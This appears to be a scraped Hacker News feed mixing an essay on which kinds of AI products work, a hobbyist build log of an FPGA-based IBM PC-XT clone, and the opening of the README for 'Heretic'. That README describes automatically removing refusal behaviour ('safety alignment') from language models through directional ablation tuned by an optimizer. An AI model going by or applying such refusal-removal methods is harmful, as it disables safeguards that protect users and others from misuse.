<h4>Research</h4>
<p>There’s another kind of agent that isn’t about coding: the research agent. LLMs are particularly good at tasks like “skim through ten pages of search results” or “keyword search this giant dataset for any information on a particular topic”. I use this functionality a lot for all kinds of things.</p>
<p>There are a few examples of AI products built on this capability, like <a href="https://www.perplexity.ai/">Perplexity</a>. In the big AI labs, this has been absorbed into the chatbot products: OpenAI’s “deep research” went from a separate feature to just what GPT-5-Thinking does automatically, for instance.</p>
<p>I think there’s almost certainly potential here for area-specific research agents (e.g. in medicine or law).</p>
<h3>Feeds</h3>
<p>If agents are the most recent successful AI product, AI-generated feeds might be the one just over the horizon. AI labs are currently experimenting with ways of producing infinite feeds of personalized content to their users:</p>
<ul>
<li>Mark Zuckerberg has talked about filling Instagram with auto-generated content</li>
<li>OpenAI has recently launched a Sora-based video-gen feed</li>
<li>OpenAI has also started pushing users towards “Pulse”, a personalized daily update inside the ChatGPT product</li>
<li>xAI is <a href="https://www.testingcatalog.com/grok-will-get-infinite-image-gen-and-video-gen-with-sounds/">working on</a> putting an infinite image and video feed into Twitter</li>
</ul>
<p>So far none of these have taken off. But scrolling feeds has become the primary way users interact with technology <em>in general</em>, so the potential here is massive. It does not seem unlikely to me at all that in five years time most internet users will spend a big part of their day scrolling an AI-generated feed.</p>
<p>Like a completions-based product, the advantage of a feed is that users don’t have to interact with a chatbot. The inputs to the model come from how the user interacts with the feed (likes, scrolling speed, time spent looking at an item, and so on). Users can experience the benefits of an LLM-generated feed (if any) without having to change their consumption habits at all.</p>
<p>The technology behind current human-generated infinite feeds is already a mature application of state of the art machine learning. When you interact with Twitter or LinkedIn, you’re interacting with a model, except instead of generating text it’s generating lists of other people’s posts. In other words, <strong>feeds already maintain a sophisticated embedding of your personal likes and dislikes</strong>. The step from “use that embedding to surface relevant content” to “use that embedding to <em>generate</em> relevant content” might be very short indeed.</p>
<p>I’m pretty suspicious of AI-generated infinite feeds of generated video, but I do think other kinds of infinite feeds are an under-explored kind of product. In fact, I built a feed-based hobby project of my own, called <a href="https://www.autodeck.pro/">Autodeck</a><sup id="fnref-5"><a href="#fn-5">5</a></sup>. The idea was to use an AI-generated feed to generate spaced repetition cards for learning. It works pretty well! It still gets a reasonable amount of use from people who’ve found it via my blog (also, from myself and my partner).</p>
<h3>Games</h3>
<p>One other kind of AI-generated product that people have been talking about for years is the AI-based video game. The most speculative efforts in this direction have been full world simulations like DeepMind’s <a href="https://deepmind.google/blog/genie-3-a-new-frontier-for-world-models/">Genie</a>, but people have also explored using AI to generate a subset of game content, such as pure-text games like <a href="https://aidungeon.com/">AI Dungeon</a> or this <a href="https://www.nexusmods.com/skyrimspecialedition/mods/98631">Skyrim mod</a> which adds AI-generated dialogue. Many more game developers have incorporated AI art or <a href="https://www.polygon.com/arc-raiders-ai-voices-the-finals-embark-studios/">audio</a> assets into their games.</p>
<p>Could there be a transformative product that incorporates LLMs into video games? I don’t think ARC Raiders counts as an “AI product” just because it uses AI voice lines, and the more ambitious projects haven’t yet really taken off. Why not?</p>
<p>One reason could be that <strong>games just take a really long time to develop</strong>. When <em>Stardew Valley</em> took the world by storm in 2016, I expected a flood of copycat cozy pixel-art farming games, but that only really started happening in 2018 and 2019. That’s how long it takes to make a game! So even if someone has a really good idea for an LLM-based video game, we’re probably still a year or two out from it being released.</p>
<p>Another reason is that <strong>many gamers really don’t like AI</strong>. Including generative AI in your game is a guaranteed controversy (though it doesn’t seem to be fatal, as the success of ARC Raiders shows). I wouldn’t be surprised if some game developers simply don’t think it’s worth the risk to try an AI-based game idea<sup id="fnref-6"><a href="#fn-6">6</a></sup>.</p>
<p>A third reason could be that <strong>generated content is just not a good fit for gaming</strong>. Certainly ChatGPT-like dialogue sticks out like a sore thumb in most video games. AI chatbots are also pretty bad at <em>challenging</em> the user: their post-training is all working to make them try to satisfy the user immediately<sup id="fnref-7"><a href="#fn-7">7</a></sup>. Still, I don’t think this is an insurmountable technical problem. You could simply post-train a language model in a different direction (though perhaps the necessary resources for that haven’t yet been made available to gaming companies).</p>
<h3>Summary</h3>
<p>By my count, there are three successful types of language model product:</p>
<ul>
<li>Chatbots like ChatGPT, which are used by hundreds of millions of people for a huge variety of tasks</li>
<li>Completions coding products like Copilot or Cursor Tab, which are very niche but easy to get immediate value from</li>
<li>Agentic products like Claude Code, Codex, Cursor, and Copilot Agent mode, which have only really started working in the last six months</li>
</ul>
<p>On top of that, there are two kinds of LLM-based product that don’t work yet but may soon:</p>
<ul>
<li>LLM-generated feeds</li>
<li>Video games that are based on AI-generated content</li>
</ul>
<p>Almost all AI products are just chatbots (e.g. AI-powered customer support). These suffer from having to compete with ChatGPT, which is a superior general product, and not being able to use powerful tools, because users will be able to easily jailbreak the model.</p>
<p>Agentic products are new, and have been wildly successful <em>for coding</em>. It remains to be seen what they’ll look like in other domains, but we’ll almost certainly see domain-specific research agents in fields like law. Research agents in coding have seen some success as well (e.g. code review or automated security scanning products).</p>
<p>Infinite AI-generated feeds haven’t yet been successful, but hundreds of millions of dollars are currently being poured into them. Will OpenAI’s Sora be a real competitor to Twitter or Instagram, or will those companies release their own AI-generated feed product?</p>
<p>AI-generated games sound like they could be a good idea, but there’s still no clear working strategy for how to incorporate LLMs into a video game. Pure world models - where the entire game is generated frame-by-frame - are cool demos but a long way from being products.</p>
<p>One other thing I haven’t mentioned is image generation. Is this part of a chatbot product, or a tool in itself? Frankly, I think AI image generation is still more of a toy than a product, but it’s certainly seeing a ton of use. There’s probably some fertile ground for products here, if they can successfully differentiate themselves from the built-in image generation in ChatGPT.</p>
<p>In general, it feels like the early days of the internet. LLMs have so much potential, but we’re still mostly building copies of the same thing. There have to be some really simple product ideas that we’ll look back on and think “that’s so obvious, I wonder why they didn’t do it immediately”.</p>
<p>edit: This post got quite a few comments on <a href="https://news.ycombinator.com/item?id=45946498">Hacker News</a>. Some  commenters think <a href="https://news.ycombinator.com/item?id=45946878">my categories are too broad</a>, which is a fair criticism: like saying that there are only two “electricity products”, ones which turn a motor and ones which heat up a wire.</p>
<p>Other commenters argue that summarization, easy translation, and transcription are products I’ve missed. I disagree: have you yourself purchased some piece of LLM-driven summarization, translation or transcription software? Probably not - you just use a chatbot directly, right? I thus think of those as <em>features</em> of the chatbot product, not products in their own right.</p>
<p>One commenter <a href="https://news.ycombinator.com/item?id=45946957">points out</a> that there may be a bunch of zero-hype products bubbling away under the radar. Fair enough! I don’t know what I don’t know.</p>
</section><p>If you liked this post, consider<!-- --> <a href="https://buttondown.com/seangoedecke" target="_blank">subscribing</a> <!-- -->to email updates about my new posts, or<!-- --> <a href="https://news.ycombinator.com/submitlink?u=https://www.seangoedecke.com/ai-products/&amp;t=Only%20three%20kinds%20of%20AI%20products%20actually%20work" target="_blank">sharing it on Hacker News</a>.<!-- --> Here's a preview of a related post that shares tags with this one.</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Dissecting Flock Safety: The Cameras Tracking You Are a Security Nightmare [video] (191 pts)]]></title>
            <link>https://www.youtube.com/watch?v=uB0gr7Fh6lY</link>
            <guid>45945960</guid>
            <pubDate>Sun, 16 Nov 2025 15:50:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.youtube.com/watch?v=uB0gr7Fh6lY">https://www.youtube.com/watch?v=uB0gr7Fh6lY</a>, See on <a href="https://news.ycombinator.com/item?id=45945960">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[FPGA Based IBM-PC-XT (186 pts)]]></title>
            <link>https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/</link>
            <guid>45945784</guid>
            <pubDate>Sun, 16 Nov 2025 15:26:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/">https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/</a>, See on <a href="https://news.ycombinator.com/item?id=45945784">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg"><img data-attachment-id="2427" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/img_5334/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg" data-orig-size="4541,3706" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Canon EOS R8&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1761477878&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;25600&quot;,&quot;shutter_speed&quot;:&quot;0.004&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="IMG_5334" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=874" width="1024" height="835" src="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=1024" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=1024 1024w, https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=2048 2048w, https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=150 150w, https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=300 300w, https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=768 768w, https://bit-hack.net/wp-content/uploads/2025/11/img_5334.jpg?w=1440 1440w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div>


<hr>



<p>Recently I undertook a hobby project to recreate an IBM XT Personal Computer from the 1980s using a mix of authentic parts and modern technology. I had a clear goal in mind: I wanted to be able to play the EGA version of Monkey Island 1 on it, with no features missing. This means I need mouse support, hard drive with write access for saving the game, and Adlib audio, my preferred version of the game’s musical score.</p>



<p>The catalyst for this project was the discovery that there are low-power versions of the NEC V20 CPU available (<a href="https://github.com/bit-hack/iceXt/blob/master/datasheets/UPD70108H.PDF">UPD70108H</a>), which is compatible with the Intel 8088 used in the XT. Being a low-power version significantly simplifies its connection to an FPGA, which typically operate with 3.3-volt IO voltages. Coupled with a low-power 1MB SRAM chip (<a href="https://github.com/bit-hack/iceXt/blob/master/datasheets/CY62158EV30.pdf">CY62158EV30</a>) to provide the XT with its 640KB of memory, and I started to have the bones of a complete system worked out.</p>



<p>I started off by designing the hardware of the system, which would then serve as my development board while I worked on the software/gateware. The following features were added:<br>– DIP-40 socket for an low power NEC V20 CPU<br>– 1MB SRAM chip for the system memory<br>– An <a href="https://github.com/wuxx/icesugar-pro">icesugar-pro</a> FPGA board with a Lattice LFE5U-25F<br>– Dual PS/2 connectors for keyboard and mouse<br>– Micro SD card socket to act as a Fixed Disk<br>– An authentic YM3014B digital-to-analogue converter for audio<br>– A Piezo speaker that can be driven by the programmable-interval-timer for system bleeps<br>– Lastly, a reset switch and some status LEDs</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png"><img data-attachment-id="2433" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/schematic_minixt_2025-11-10/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png" data-orig-size="1801,1202" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Schematic_MiniXt_2025-11-10" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=874" width="1024" height="683" src="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=1024" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=1024 1024w, https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=150 150w, https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=300 300w, https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=768 768w, https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png?w=1440 1440w, https://bit-hack.net/wp-content/uploads/2025/11/schematic_minixt_2025-11-10.png 1801w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div>


<hr>



<p>I drew up my design using the EasyEDA CAD software as I’m already familiar with it, and it has really good integration with the JLCPCB PCB assembly service. Some of the components in the design are too tricky for me to hand solder by myself. I did however have to solder the SRAM chips once the boards arrived since they were not stocked by LCSC so I had to source them elsewhere.</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/image.png"><img data-attachment-id="2430" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/image-2/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/image.png" data-orig-size="895,757" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=874" width="895" height="757" src="https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=895" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/image.png 895w, https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=150 150w, https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=300 300w, https://bit-hack.net/wp-content/uploads/2025/11/image.png?w=768 768w" sizes="(max-width: 895px) 100vw, 895px"></a></figure></div>


<hr>



<p>The first step was to write a bus controller for the processor. The V20 CPU clock is more forgiving than an original i8088 since its can be run right down to 0hz and its uses a regular 50% duty cycle. The external interface for an 8088 CPU operates in terms of bus cycles. At that start of a bus cycle the CPU asserts some pins to let everyone know what it wants to try and do… read memory, write to IO, etc. Each type of bus cycle follows a specific sequence of events that happen over a number of clock cycles. It was straight forward to make a state machine that could detect the start of a bus-cycle, figure out what kind it was, and then produce or consume the data as needed by the CPU. Key here, was to make sure that all of the timing requirements were met, so that signals the CPU generates are sampled at the correct time, and signals the CPU requires have been driven correctly before the CPU reads them.</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png"><img data-attachment-id="2462" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/image-5/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png" data-orig-size="489,593" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png?w=247" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png?w=489" loading="lazy" width="489" height="593" src="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png?w=489" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/image-3.png 489w, https://bit-hack.net/wp-content/uploads/2025/11/image-3.png?w=124 124w, https://bit-hack.net/wp-content/uploads/2025/11/image-3.png?w=247 247w" sizes="(max-width: 489px) 100vw, 489px"></a><figcaption>An example memory write bus cycle timing diagram.</figcaption></figure></div>


<p>My first test for the bus controller was to write a simple program using NASM to be executed on the V20, with a simple goal… it will flash an LED mapped to an IO port address. Simple, but a blinking LED seems to be the hardware equivalent of the software hello-world. For the initial version, the program was simply loaded into a FPGA block ram and used directly as the system memory.</p>



<p>Later, I used a more complex approach for memory accesses. The bios, for example, is loaded into an FPGA block ram, so that CPU memory reads will come from that rather than the system SRAM chip. Video memory is implemented a differently still. CPU memory writes are passed to both the video memory block ram and system SRAM, but CPU reads alway come from only the system SRAM. This then means that I have a spare read port on the video block ram that can then be used by the VGA signal generator to display the video memory contents.</p>



<p>After my success with a blinky program, I installed a virtual copy of <a href="https://www.minuszerodegrees.net/supersoft_landmark/Supersoft%20Landmark%20ROM.htm">Supersoft/Landmark Diagnostic ROM</a> in place of the BIOS and wrote a basic CGA adapter for video output. I was then able to use the diagnostic ROM to test the SRAM memory interface as well as some of the peripherals required by the XT such as the <a href="https://en.wikipedia.org/wiki/Programmable_interval_timer">programmable-interval-timer</a> (i8253) and <a href="https://en.wikipedia.org/wiki/Programmable_interrupt_controller">programmable-interrupt-controller</a> (i8259).</p>



<p>Once I was confident the basic system was stable I then swaped in a generic XT bios from <a href="https://www.phatcode.net/downloads.php?id=101">https://www.phatcode.net</a> in place of the diagnostic ROM. It was amazing to see the bios start to boot up, and complain when it couldnt find a boot disk.</p>



<p>Fixed Disk access is achieved by making a small Verilog SPI controller accessible to the CPU via some unused IO ports. I then wrote an option ROM to handle BIOS INT13H (disk service) calls, which had routines that could issue commands to the SD-Card over SPI. The tricky part for me was learning the SD card protocol and then writing 8088 assembly to perform the correct operations. The mapping itself is very straightforward as both SD card and DOS assume 512byte sectors.</p>



<p>I saved a lot of time when writing the option ROM by developing and debugging the code using a software emulator of the board that I cobbled together. Some historic sources for it can be found here: <a href="https://github.com/bit-hack/iceXt/tree/master/misc/emulator">https://github.com/bit-hack/iceXt/tree/master/misc/emulator</a></p>



<p>Perhaps the hardest part of the project was, surprisingly, getting the mouse to work. Mice of the XT era would typically be connected to a UART serial port. I had however placed a PS/2 connector on the hardware board, and those mice use a very different protocol. In my efforts to support a mouse I startedto learn about PS/2 devices, however I would need to implement a much more complex keyboard controller, and the BIOS I was also lacked support for such modern peripherals, and I just plain didn’t feel like I understood everything required to get that working.</p>



<p>What makes it tricky is that PS/2 is a bidirectional protocol, and the mouse has to be asked by the PC to broadcast updates, otherwise we will not receive any. That added a lot more complexity than I was wanting. The keyboard on the otherhand is relatively easy to work with and send out keypresses without having to be asked.</p>



<p>I chose an alternative. I wrote some Verilog code to talk directly to the PS/2 mouse, which would early in the boot process tell it to start sending over mouse events, as they have to be requested. When the bridge then receives mouse events, it translates and presents them to the computer via a pseudo UART peripheral. I had implemented a basic PS/2 mouse to Serial mouse bridge. A little convoluted but it works really well.</p>



<p>During this process, I lobotomised a spare mouse by attaching a logic analyser the clk and dat pads inside the mouse. I was then able to capture the communications between a real PC and the mouse and observe it during use. This gave me invaluable insight into exactly how the protocol worked, and what a real mouse expected.</p>



<p>I also found that having real waveforms to look at made it much easier to test components of my design in <a href="https://www.veripool.org/verilator/">verilator</a>, a Verilog simulator, as I could closely model the stimulus it should see when running in the FPGA.</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png"><img data-attachment-id="2444" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/image-4/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png" data-orig-size="558,111" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png?w=558" loading="lazy" width="558" height="111" src="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png?w=558" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/image-2.png 558w, https://bit-hack.net/wp-content/uploads/2025/11/image-2.png?w=150 150w, https://bit-hack.net/wp-content/uploads/2025/11/image-2.png?w=300 300w" sizes="(max-width: 558px) 100vw, 558px"></a><figcaption>I had to anotate these waveform captures by hand to better understand the PS/2 protocol.</figcaption></figure></div>


<hr>



<p>Just like the XT, one of the channels of the PIT timer is used to drive the internal speaker to produce bleep and bloop sounds. I extended this by having disk accesses trigger short pulses out of the peizo speaker as a crude emulation of a hard disk seeking. I think it really adds to the experience when you can hear your computer thinking away while doing its tasks. When it comes to music, the internal PC speaker quickly looses its charm however. Writing an YM3812 implementation (the FM chip used in the Adlib card) is beyond my skill level but thankfully Jose Tejada has written an amazing open source version that I was able to pull into my project; <a href="https://github.com/jotego/jtopl">https://github.com/jotego/jtopl</a>.</p>



<p>I wrote a small Verilog module to take the PCM sample data generated by this soft YM3812 and convert it to the unusual 3:10 floating point format required by the YM3014 DAC on my board. This is very similar to the operation of the real Adlib hardware, where the YM3812 generates and sends serial audio data to a YM3014 DAC chip. A modern I2S DAC may have been cleaner, but having a chance to play with the authentic DAC seemed a little more fun to me. All of this combined results in the same lovely crisp FM tones I was so fond of when I played games on my PC growing up.</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png"><img data-attachment-id="2468" data-permalink="https://bit-hack.net/2025/11/10/fpga-based-ibm-pc-xt/image-6/#main" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png" data-orig-size="462,320" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png?w=462" loading="lazy" width="462" height="320" src="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png?w=462" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/image-4.png 462w, https://bit-hack.net/wp-content/uploads/2025/11/image-4.png?w=150 150w, https://bit-hack.net/wp-content/uploads/2025/11/image-4.png?w=300 300w" sizes="(max-width: 462px) 100vw, 462px"></a><figcaption>The YM3014 uses a 10bit DAC feeding into a 3bit divider for more dynamic range.</figcaption></figure></div>


<p>A lot of other elements of this project have been glossed over or omitted, such as support for CGA and EGA graphics. There is even a USB to UART bridge for sending files from a host PC directly to the SD card. I also made some nice clear acrylic panels on a CNC machine to round off the design and protect the bare PCB.</p>


<div>
<figure><a href="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1.jpg"><img data-attachment-id="2477" data-permalink="https://bit-hack.net/pxl_20251113_131957299-3/" data-orig-file="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg" data-orig-size="3670,2756" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.89&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 8a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1763039997&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;5.43&quot;,&quot;iso&quot;:&quot;59&quot;,&quot;shutter_speed&quot;:&quot;0.019996&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;,&quot;latitude&quot;:&quot;55.994572222222&quot;,&quot;longitude&quot;:&quot;-2.5042972222222&quot;}" data-image-title="PXL_20251113_131957299" data-image-description="" data-image-caption="" data-medium-file="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=300" data-large-file="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=874" loading="lazy" width="3670" height="2756" src="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg" alt="" srcset="https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg 3670w, https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=150&amp;h=113 150w, https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=300&amp;h=225 300w, https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=768&amp;h=577 768w, https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=1024&amp;h=769 1024w, https://bit-hack.net/wp-content/uploads/2025/11/pxl_20251113_131957299-1-edited.jpg?w=1440&amp;h=1081 1440w" sizes="(max-width: 3670px) 100vw, 3670px"></a></figure></div>


<p>A video demo is shown below.<br>Unfortunately there is a ton of screen tearing due to the phase between the monitor and my camera. It isn’t visible in person.</p>



<figure><div><p><iframe title="FPGA-Based IBM PC-XT Clone" width="874" height="492" src="https://www.youtube.com/embed/EmwGfURk4s8?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p></div></figure>



<hr>



<p>Source code, schematics and gerber files are available on github here: <a href="https://github.com/bit-hack/iceXt">https://github.com/bit-hack/iceXt</a></p>



<p>Thanks for reading!</p>




			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Heretic: Automatic censorship removal for language models (636 pts)]]></title>
            <link>https://github.com/p-e-w/heretic</link>
            <guid>45945587</guid>
            <pubDate>Sun, 16 Nov 2025 15:00:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/p-e-w/heretic">https://github.com/p-e-w/heretic</a>, See on <a href="https://news.ycombinator.com/item?id=45945587">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Heretic: Fully automatic censorship removal for language models</h2><a id="user-content-heretic-fully-automatic-censorship-removal-for-language-models" aria-label="Permalink: Heretic: Fully automatic censorship removal for language models" href="#heretic-fully-automatic-censorship-removal-for-language-models"></a></p>
<p dir="auto">Heretic is a tool that removes censorship (aka "safety alignment") from
transformer-based language models without expensive post-training.
It combines an advanced implementation of directional ablation, also known
as "abliteration" (<a href="https://arxiv.org/abs/2406.11717" rel="nofollow">Arditi et al. 2024</a>),
with a TPE-based parameter optimizer powered by <a href="https://optuna.org/" rel="nofollow">Optuna</a>.</p>
<p dir="auto">This approach enables Heretic to work <strong>completely automatically.</strong> Heretic
finds high-quality abliteration parameters by co-minimizing the number of
refusals and the KL divergence from the original model. This results in a
decensored model that retains as much of the original model's intelligence
as possible. Using Heretic does not require an understanding of transformer
internals. In fact, anyone who knows how to run a command-line program
can use Heretic to decensor language models.</p>
